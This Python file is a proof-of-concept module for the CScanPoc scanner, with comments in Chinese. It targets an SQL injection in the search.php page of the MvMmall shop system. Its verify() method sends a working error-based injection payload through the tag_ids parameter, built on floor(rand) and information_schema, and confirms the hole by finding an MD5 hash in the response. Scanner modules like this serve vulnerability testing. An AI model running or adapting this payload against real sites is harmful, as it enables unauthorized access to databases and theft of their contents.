# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'MvMmall_0001'  # 平台漏洞编号，留空
    name = 'MvMmall 网店商城系统 /search.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2011-03-27'  # 漏洞公布时间
    desc = '''
        MvMmall网店商城系统最新注入0day问题出在搜索search.php这个文件上。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MvMmall'  # 漏洞应用名称
    product_version = 'MvMmall网店商城系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '251af4e4-e6e1-4626-8020-525b78eff4dc'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from"
                       "(select%20count(*),concat((select%20(select%20md5(12345))%20"
                       "from%20information_schema.tables%20limit%200,1),floor(rand(0)"
                       "*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20"
                       "and%201=1%23")
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '827ccb0eea8a706c4c34a16891f84e7b' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
